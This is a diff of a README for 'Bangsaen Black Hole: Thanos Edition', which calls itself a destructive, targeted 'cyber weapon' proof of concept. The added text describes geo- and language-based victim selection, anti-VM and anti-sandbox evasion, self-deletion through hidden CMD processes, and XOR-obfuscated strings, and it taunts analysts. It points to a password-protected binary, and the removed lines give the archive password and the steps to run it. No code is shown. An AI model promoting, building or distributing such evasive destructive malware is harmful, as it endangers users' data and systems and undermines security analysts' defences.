@@ -1,27 +1,36 @@
-### The First Standalone Artifact 🚀
+# 🕳️ Bangsaen Black Hole: Thanos Edition (C++ / Flutter)
 
-This release contains the fully compiled, obfuscated, and packed binary of the **Bangsaen Black Hole: Thanos Edition**.
+**"You thought the Python version was the monster. We rewrote it in Native C++."**
 
-**🔥 Key Features in this Build:**
-* Standalone Windows Executable (No Flutter/Dart SDK required).
-* Native C++ Core (`native_core.dll`) with In-Memory XOR Encryption.
-* Hardware-level Anti-VM/Anti-Sandbox detection.
-* 3-Layer Environmental Targeting (UI Lang, Region, Timezone).
-* Self-Destruct Registry Stamping.
+Welcome to the **Thanos Edition** — The World's First Agentic Destructive AI (Proof of Concept). This is not a simple file deleter. This is a highly targeted, single-use, environment-aware cyber weapon designed to demonstrate Advanced Threat Evaluation, Anti-VM evasion, and OS-Level Kamikaze protocols.
 
----
+## 🚀 The Architecture
+We abandoned the Python wrappers. This edition is forged in **Native C++ (Win32 API)** bridged with a highly obfuscated **Dart/Flutter** binary frontend. 
 
-### ⚠️ IMPORTANT WARNING & EXTRACTION
-This is a live Proof of Concept demonstrating destructive behaviors. Your Antivirus/EDR **will** likely flag it. 
+1. **Agentic Threat Evaluation (3-Layer Radar):** The C++ core (`native_core.dll`) evaluates its execution environment in real-time. It actively scans UI Language, Region Formats, and Timezones to distinguish between a "Target" and a "Civilian".
+2. **Anti-VM & Anti-Sandbox:** Analysts cannot safely detonate this in a standard sandbox. The engine probes physical hardware constraints (RAM, CPU Hypervisors). If an artificial environment is detected, it triggers the Level 666 Protocol.
+3. **The Kamikaze Protocol (Single-Use Weapon):** Once execution is completed (or a trap is triggered), the binary permanently stamps the Windows Registry and self-destructs via invisible CMD child processes.
+4. **Binary Hardening:** Strings and target paths are encrypted in-memory using XOR mechanisms. `strings.exe` will find nothing but garbage.
 
-🔒 **Archive Password:** `snap`
+## ⚠️ EDUCATIONAL PURPOSE ONLY / DISCLAIMER
+This project is a Cybersecurity Proof of Concept (PoC) demonstrating malware analysis evasion and targeted execution flows. 
+**DO NOT use this maliciously.** The creators assume NO liability and are NOT responsible for any misuse, data loss, or system damage caused by this program. This tool is built strictly for IT Security Research.
 
-**Instructions:**
-1. Download `BangsaenBlackHole_Thanos_v1.0.0.zip`
-2. Extract using 7-Zip or WinRAR (Password: `snap`)
-3. Run `bangsaen_blackhole_thanos.exe` at your own risk.
+## 🕵️‍♂️ Message to Reverse Engineers
+If you are analyzing this binary, be careful. 
+* Attempting to run this in a Sandbox will result in immediate termination. 
+* Attempting to run this twice will trigger the Bloated Hell lock.
+* The Dart engine is fully obfuscated. The C++ DLL uses in-memory decryption. 
+Bring your best disassemblers. 
 
-*By downloading this file, you agree to use it strictly for educational and research purposes.*
+## 🛠️ Execution (Windows Only)
+Please download the compiled binary from the **Releases** section. 
+*(Note: Requires password to extract. Windows Defender may flag this due to its PoC nature. Run in an isolated, bare-metal environment at your own risk.)*
+
+## [ EASTER EGG FOR THE CURIOUS ]
+0x49 0x61 0x6D 0x49 0x6E 0x65 0x76 0x69 0x74 0x61 0x62 0x6C 0x65
+
+For Enterprise Cybersecurity Consulting or Research Collaboration: drtanet@bangsaenai.com
 
 ---
 
